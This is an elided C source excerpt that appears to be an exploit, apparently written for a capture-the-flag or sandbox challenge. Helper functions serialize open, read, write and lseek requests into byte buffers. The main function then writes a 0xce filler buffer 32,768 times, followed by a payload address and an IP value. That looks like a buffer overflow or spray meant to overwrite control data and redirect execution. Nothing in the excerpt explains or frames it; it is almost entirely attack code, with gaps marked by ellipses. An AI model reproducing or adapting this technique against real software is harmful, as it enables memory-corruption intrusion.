...
void buffer_append(uint8_t* data, uint32_t data_len)
{
  ...
  {
    uint8_t* new = __malloc(buffer_cap * 2);
    __memcpy(new, buffer, buffer_len);
    __free(buffer);
  ...
  __memcpy(buffer + buffer_len, data, data_len);
  buffer_len += data_len;
}
...
int uc(int c, const char* path)
{
  ...
  size_t slen = __strlen(path) + 1;
  s += sizeof(slen) + slen;
  s += sizeof(mode);

  uint8_t* out = __malloc(s);
  __memcpy(out, &slen, sizeof(slen));
  __memcpy(out + sizeof(slen), path, slen);
  __memcpy(out + sizeof(slen) + slen, &mode, sizeof(mode));
...
int open(const char* path, int flags, int mode)
{
  ...
  __memcpy(out, &slen, sizeof(slen));
  __memcpy(out + sizeof(slen), path, slen);
  __memcpy(out + sizeof(slen) + slen, &flags, sizeof(flags));
  __memcpy(out + sizeof(slen) + slen + sizeof(flags), &mode, sizeof(mode));
...
int rw(int r, int fd, size_t count, uint8_t* data)
{
  ...
  __memcpy(out, dumb(&fd), sizeof(fd));
  __memcpy(out + sizeof(fd), dumb(&count), sizeof(count));

  if (data)
  {
    __memcpy(out + sizeof(fd) + sizeof(count), data, count);
  }
...
int __read(int fd, size_t count)
{
  return rw(1, fd, count, NULL);
}

int __write(int fd, size_t count, uint8_t* data)
{
...
int lseek(int fd, ssize_t offset, int whence)
{
  ...
  uint8_t* out = __malloc(s);
  __memcpy(out, dumb(&fd), sizeof(fd));
  __memcpy(out + sizeof(fd), dumb(&offset), sizeof(offset));
  __memcpy(out + sizeof(fd) + sizeof(offset), dumb(&whence), sizeof(whence));
...
int main(void)
{
    ...
    __memset(all_filler_no_killer, 0xce, sizeof(all_filler_no_killer));
    for (size_t i = 0; i < 32768; ++i)
    {
      __write(1, sizeof(all_filler_no_killer), all_filler_no_killer);
    }
    __write(1, sizeof(uint32_t), dumb(payload_addr_addr));
    __write(1, sizeof(uint32_t), dumb(&t1.ipval));
